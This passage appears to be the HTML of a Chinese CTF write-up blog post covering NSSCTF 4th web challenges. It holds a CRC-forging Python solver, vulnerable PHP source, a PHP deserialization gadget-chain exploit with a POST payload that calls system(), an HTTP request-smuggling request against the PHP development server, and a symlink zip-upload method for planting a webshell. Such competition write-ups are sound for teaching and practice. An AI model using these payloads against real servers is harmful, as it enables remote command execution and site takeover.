in range(200):</span><br><span class="line">        # choose first 11 bytes randomly printable, and ensure message != secret</span><br><span class="line">        prefix = bytes([random.choice(list(printable)) for _ in range(11)])</span><br><span class="line">        # It&#x27;s okay if some match secret; Not necessary to differ except entire string; we&#x27;ll check at end.</span><br><span class="line">        # Build A for last 4 positions: 11..14 indices</span><br><span class="line">        positions = (11,12,13,14)</span><br><span class="line">        base_msg = bytearray(prefix + b&#x27;\x00\x00\x00\x00&#x27;)</span><br><span class="line">        base_msg = bytes(base_msg)</span><br><span class="line">        target = combined_crc(secret)</span><br><span class="line">        base_crc = combined_crc(base_msg)</span><br><span class="line">        bvec = base_crc ^ target</span><br><span class="line">        # Build Acols for last 4 positions</span><br><span class="line">        Acols = []</span><br><span class="line">        for pos in positions:</span><br><span class="line">            for bit in range(8):</span><br><span class="line">                arr = bytearray(base_msg)</span><br><span class="line">                arr[pos] ^= (1 &lt;&lt; bit)</span><br><span class="line">                delta = combined_crc(bytes(arr)) ^ base_crc</span><br><span class="line">                Acols.append(delta)</span><br><span class="line">        ok, x_bits, piv = solve_rectangular(Acols, bvec)</span><br><span class="line">        if not ok:</span><br><span class="line">            continue</span><br><span class="line">        # Build nullspace basis for these 32 columns</span><br><span class="line">        m = len(Acols)</span><br><span class="line">        rows = [0]*24</span><br><span class="line">        for r in range(24):</span><br><span class="line">            row = 0</span><br><span class="line">            for j in range(m):</span><br><span class="line">                if (Acols[j] &gt;&gt; r) &amp; 1:</span><br><span class="line">                    row |= (1&lt;&lt;j)</span><br><span class="line">            rows[r] = row</span><br><span class="line">        pivot_row = [-1]*m</span><br><span class="line">        pivot_col_for_row = [-1]*24</span><br><span class="line">        rnk = 0</span><br><span class="line">        for c in range(m):</span><br><span class="line">            pivot = None</span><br><span class="line">            for rr in range(rnk,24):</span><br><span class="line">                if (rows[rr] &gt;&gt; c) &amp; 1:</span><br><span class="line">                    pivot = rr; break</span><br><span class="line">            if pivot is None:</span><br><span class="line">                continue</span><br><span class="line">            if pivot != rnk:</span><br><span class="line">                rows[rnk], rows[pivot] = rows[pivot], rows[rnk]</span><br><span class="line">            for rr in range(24):</span><br><span class="line">                if rr != rnk and ((rows[rr] &gt;&gt; c) &amp; 1):</span><br><span class="line">                    rows[rr] ^= rows[rnk]</span><br><span class="line">            pivot_col_for_row[rnk] = c</span><br><span class="line">            pivot_row[c] = rnk</span><br><span class="line">            rnk += 1</span><br><span class="line">            if rnk == 24:</span><br><span class="line">                break</span><br><span class="line">        free_cols = [c for c in range(m) if pivot_row[c] == -1]</span><br><span class="line">        nvecs = []</span><br><span class="line">        for f in free_cols:</span><br><span class="line">            v = 1 &lt;&lt; f</span><br><span class="line">            for i in range(rnk-1, -1, -1):</span><br><span class="line">                c = pivot_col_for_row[i]</span><br><span class="line">                rowmask = rows[i]</span><br><span class="line">                if bin(v &amp; (rowmask &amp; ~(1&lt;&lt;c))).count(&quot;1&quot;) &amp; 1:</span><br><span class="line">                    v ^= (1 &lt;&lt; c)</span><br><span class="line">            nvecs.append(v)</span><br><span class="line">        # Try to adjust to make last 4 bytes printable</span><br><span class="line">        vals = [(x_bits &gt;&gt; (8*i)) &amp; 0xFF for i in range(4)]</span><br><span class="line">        # Try greedy search via flipping basis vectors</span><br><span class="line">        def bytes_from_solution(sol):</span><br><span class="line">            return [(sol &gt;&gt; (8*i)) &amp; 0xFF for i in range(4)]</span><br><span class="line">        # Evaluate current bytes</span><br><span class="line">        def printable_count(vs):</span><br><span class="line">            return sum(1 for b in vs if b in printable)</span><br><span class="line">        if all(b in printable for b in vals):</span><br><span class="line">            sol = x_bits</span><br><span class="line">        else:</span><br><span class="line">            # Try toggling combinations up to depth 3</span><br><span class="line">            best = (printable_count(vals), x_bits)</span><br><span class="line">            sol = None</span><br><span class="line">            basis_count = min(len(nvecs), 12)</span><br><span class="line">            # Try single toggles</span><br><span class="line">            for i in range(basis_count):</span><br><span class="line">                s = x_bits ^ nvecs[i]</span><br><span class="line">                vs = bytes_from_solution(s)</span><br><span class="line">                sc = printable_count(vs)</span><br><span class="line">                if sc == 4:</span><br><span class="line">                    sol = s; break</span><br><span class="line">                if sc &gt; best[0]:</span><br><span class="line">                    best = (sc, s)</span><br><span class="line">            if sol is None:</span><br><span class="line">                # try pairs</span><br><span class="line">                for i in range(basis_count):</span><br><span class="line">                    for j in range(i+1, basis_count):</span><br><span class="line">                        s = x_bits ^ nvecs[i] ^ nvecs[j]</span><br><span class="line">                        vs = bytes_from_solution(s)</span><br><span class="line">                        sc = printable_count(vs)</span><br><span class="line">                        if sc == 4:</span><br><span class="line">                            sol = s; break</span><br><span class="line">                    if sol is not None: break</span><br><span class="line">            if sol is None:</span><br><span class="line">                # try triples</span><br><span class="line">                for i in range(basis_count):</span><br><span class="line">                    for j in range(i+1, basis_count):</span><br><span class="line">                        for k in range(j+1, basis_count):</span><br><span class="line">                            s = x_bits ^ nvecs[i] ^ nvecs[j] ^ nvecs[k]</span><br><span class="line">                            vs = bytes_from_solution(s)</span><br><span class="line">                            sc = printable_count(vs)</span><br><span class="line">                            if sc == 4:</span><br><span class="line">                                sol = s; break</span><br><span class="line">                        if sol is not None: break</span><br><span class="line">                    if sol is not None: break</span><br><span class="line">            if sol is None:</span><br><span class="line">                sol = best[1]</span><br><span class="line">        vals = bytes_from_solution(sol)</span><br><span class="line">        m_final = bytearray(base_msg)</span><br><span class="line">        for i, pos in enumerate(positions):</span><br><span class="line">            m_final[pos] = vals[i]</span><br><span class="line">        m_final = bytes(m_final)</span><br><span class="line">        if all(32 &lt;= b &lt;= 126 for b in m_final) and m_final != secret:</span><br><span class="line">            return m_final, vals, prefix</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">res = find_fully_printable_solution_with_last4()</span><br><span class="line">res[:2] if res else None</span><br><span class="line"></span><br><span class="line">(b&#x27;cDXM 4pujqY/-IC&#x27;, [47, 45, 73, 67])</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>cDXM 4pujqY/-IC</code>即可。</p>
+<p><img src="/images/migrated/19056516/02.png" alt="image"></p>
+<h2 id="mpga-filesystem"><a href="#mpga-filesystem" class="headerlink" title="[mpga]filesystem"></a>[mpga]filesystem</h2><p>下载<a target="_blank" rel="noopener" href="http://www.zip,有源码.action=home时post传submit/_md5%E6%9C%89%E4%BB%BB%E6%84%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">www.zip，有源码。action=home时POST传submit\_md5有任意反序列化</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ApplicationContext&#123;</span><br><span class="line">    public $contextName; </span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;contextName = &#x27;ApplicationContext&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;contextName = strtolower($this-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ContentProcessor&#123;</span><br><span class="line">    private $processedContent; </span><br><span class="line">    public $callbackFunction;   </span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    </span><br><span class="line">        $this-&gt;processedContent = new FunctionInvoker();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        </span><br><span class="line">        if (property_exists($this, $key)) &#123;</span><br><span class="line">            if (is_object($this-&gt;$key) &amp;&amp; is_string($this-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                $this-&gt;$key-&gt;&#123;$this-&gt;callbackFunction&#125;($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileManager&#123;</span><br><span class="line">    public $targetFile; </span><br><span class="line">    public $responseData = &#x27;default_response&#x27;; </span><br><span class="line"></span><br><span class="line">    public function __construct($targetFile = null)&#123;</span><br><span class="line">        $this-&gt;targetFile = $targetFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function filterPath()&#123; </span><br><span class="line">        </span><br><span class="line">        if(preg_match(&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;,$this-&gt;targetFile))&#123;</span><br><span class="line">            die(&#x27;文件路径不符合规范&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function performWriteOperation($var)&#123; </span><br><span class="line">        </span><br><span class="line">        $targetObject = $this-&gt;targetFile; </span><br><span class="line">        $value = $targetObject-&gt;$var; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFileHash()&#123; </span><br><span class="line">        $this-&gt;filterPath(); </span><br><span class="line"></span><br><span class="line">        if (is_string($this-&gt;targetFile)) &#123;</span><br><span class="line">            if (file_exists($this-&gt;targetFile)) &#123;</span><br><span class="line">                $md5_hash = md5_file($this-&gt;targetFile);</span><br><span class="line">                return &quot;文件MD5哈希: &quot; . htmlspecialchars($md5_hash);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;文件未找到&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (is_object($this-&gt;targetFile)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                </span><br><span class="line">                $md5_hash = md5_file($this-&gt;targetFile);</span><br><span class="line">                return &quot;文件MD5哈希 (尝试): &quot; . htmlspecialchars($md5_hash);</span><br><span class="line">            &#125; catch (TypeError $e) &#123;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                return &quot;无法计算MD5哈希，因为文件参数无效: &quot; . htmlspecialchars($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;文件未找到&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if (isset($_POST[&#x27;method&#x27;]) &amp;&amp; method_exists($this, $_POST[&#x27;method&#x27;])) &#123;</span><br><span class="line">            $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">            $var = isset($_POST[&#x27;var&#x27;]) ? $_POST[&#x27;var&#x27;] : null;</span><br><span class="line">            $this-&gt;$method($var); </span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;responseData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FunctionInvoker&#123;</span><br><span class="line">    public $functionName; </span><br><span class="line">    public $functionArguments; </span><br><span class="line">    public function __call($name, $arg)&#123;</span><br><span class="line">        </span><br><span class="line">        if (function_exists($name)) &#123;</span><br><span class="line">            $name($arg[0]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 省略</span><br><span class="line"></span><br><span class="line">if ($action === &#x27;home&#x27; &amp;&amp; isset($_POST[&#x27;submit_md5&#x27;])) &#123;</span><br><span class="line">    $filename_param = isset($_POST[&#x27;file_to_check&#x27;]) ? $_POST[&#x27;file_to_check&#x27;] : &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    if (!empty($filename_param)) &#123;</span><br><span class="line">        $file_object = @unserialize($filename_param);</span><br><span class="line">        if ($file_object === false || !($file_object instanceof FileManager)) &#123;</span><br><span class="line">            $file_object = new FileManager($filename_param);</span><br><span class="line">        &#125;</span><br><span class="line">        $output = $file_object-&gt;getFileHash();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $output = &quot;&lt;p class=&#x27;text-gray-600&#x27;&gt;请输入文件路径进行MD5校验。&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">// 省略</span><br></pre></td></tr></table></figure>
+
+<p>链子：</p>
+<p><code>ApplicationContext::__destruct()</code>触发<code>FileManager::__toString()</code></p>
+<p><code>FileManager::__toString()</code>调用<code>performWriteOperation</code></p>
+<p><code>performWriteOperation</code>最终通过<code>ContentProcessor</code>和<code>FunctionInvoker</code>实现命令执行</p>
+<p>EXP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ApplicationContext &#123;</span><br><span class="line">    public $contextName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ContentProcessor &#123;</span><br><span class="line">    private $processedContent;</span><br><span class="line">    public $callbackFunction;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;processedContent = new FunctionInvoker();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileManager &#123;</span><br><span class="line">    public $targetFile;</span><br><span class="line">    public $responseData;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;responseData = &quot;string_response&quot;; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FunctionInvoker &#123;</span><br><span class="line">    public function __call($name, $arguments) &#123;</span><br><span class="line">        if (function_exists($name)) &#123;</span><br><span class="line">            return $name($arguments[0]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$invoker = new FunctionInvoker();</span><br><span class="line"></span><br><span class="line">$processor = new ContentProcessor();</span><br><span class="line">$processor-&gt;callbackFunction = &#x27;system&#x27;;</span><br><span class="line">$fileManager = new FileManager();</span><br><span class="line">$fileManager-&gt;targetFile = $processor; </span><br><span class="line"></span><br><span class="line">$appContext = new ApplicationContext();</span><br><span class="line">$appContext-&gt;contextName = $fileManager; </span><br><span class="line"></span><br><span class="line">echo serialize($appContext);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST Payload（%00换\x00）:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_to_check=O:18:&quot;ApplicationContext&quot;:1:&#123;s:11:&quot;contextName&quot;;O:11:&quot;FileManager&quot;:2:&#123;s:10:&quot;targetFile&quot;;O:16:&quot;ContentProcessor&quot;:2:&#123;s:34:&quot;%00ContentProcessor%00processedContent&quot;;O:15:&quot;FunctionInvoker&quot;:0:&#123;&#125;s:16:&quot;callbackFunction&quot;;s:6:&quot;system&quot;;&#125;s:12:&quot;responseData&quot;;s:15:&quot;string_response&quot;;&#125;&#125;&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=dir&amp;submit_md5=1</span><br></pre></td></tr></table></figure>
+
+<p>本地打一下</p>
+<p><img src="/images/migrated/19056516/03.png" alt="image"></p>
+<p>没问题 上远程：</p>
+<p><img src="/images/migrated/19056516/04.png" alt="image"></p>
+<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h2><p>从报错页能看出来是php development server。搜一下就能发现：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46203060/article/details/129350280">https://blog.csdn.net/weixin_46203060&#x2F;article&#x2F;details&#x2F;129350280</a></p>
+<p>直接抄payload打：</p>
+<p><img src="/images/migrated/19056516/05.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: node10.anna.nssctf.cn:22764</span><br><span class="line"></span><br><span class="line">GET /123.123HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>这之后就是CISCN unzip同款做题方法：</p>
+<p>创建一个软链接文件<code>link</code>，指向网站根目录<code>/var/www/html</code>，压缩上传</p>
+<p>创建同名文件夹<code>link</code>，在文件夹里创建木马文件，在使在解压后能够覆盖<code>link</code>文件即<code>/var/www/html</code>目录，可以实现把木马解压到<code>/var/www/html</code>目录getshell</p>
+<p><img src="/images/migrated/19056516/06.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-signin"><span class="toc-number">1.1.</span> <span class="toc-text">ez_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzCRC"><span class="toc-number">1.2.</span> <span class="toc-text">EzCRC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mpga-filesystem"><span class="toc-number">1.3.</span> <span class="toc-text">[mpga]filesystem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.4.</span> <span class="toc-text">ez_upload</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&text=NSSCTF 4th WEB wp 全解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&is_video=false&description=NSSCTF 4th WEB wp 全解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NSSCTF 4th WEB wp 全解&body=Check out this article: https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&name=NSSCTF 4th WEB wp 全解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&t=NSSCTF 4th WEB wp 全解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
